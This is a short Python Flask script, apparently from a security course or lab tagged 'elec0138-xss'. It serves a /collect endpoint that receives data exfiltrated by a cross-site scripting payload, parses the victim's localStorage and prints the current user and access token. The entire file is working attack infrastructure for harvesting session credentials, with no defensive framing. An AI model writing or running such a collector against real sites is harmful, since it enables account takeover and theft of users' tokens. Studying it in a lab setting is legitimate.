import json

from flask import Flask, request

app = Flask(__name__)


@app.route('/collect')
def collect():
    data = request.args.to_dict()

    print(f"Data received!")

    if data.get('dt') == 'elec0138-xss':
        local_storage = json.loads(data['localStorage'])
        current_user = local_storage.get('currentUser')
        access_token = local_storage.get('access_token')

        print(f"Current user: {current_user}")
        print(f"Access token: {access_token}")

    return '', 204


if __name__ == '__main__':
    app.run(port=8080)
